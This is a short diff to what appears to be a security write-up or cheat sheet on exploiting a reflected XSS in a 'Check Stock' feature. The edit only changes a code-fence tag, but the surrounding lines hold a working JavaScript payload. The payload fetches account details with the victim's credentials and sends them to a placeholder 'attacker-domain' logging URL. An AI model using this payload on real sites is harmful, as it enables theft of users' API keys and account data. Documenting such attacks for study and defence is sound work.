@@ -163,7 +163,7 @@ In this scenario, we found a reflected XSS vulnerability on the 'Check Stock' fe
 
 Craft a one-liner JavaScript to exfiltrate the apiKey
 
-```Javascript
+```javascript
 <script>
     document.location="http://stock.VULN.net/?productId=1<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://VULN.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://attacker-domain/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
 </script>
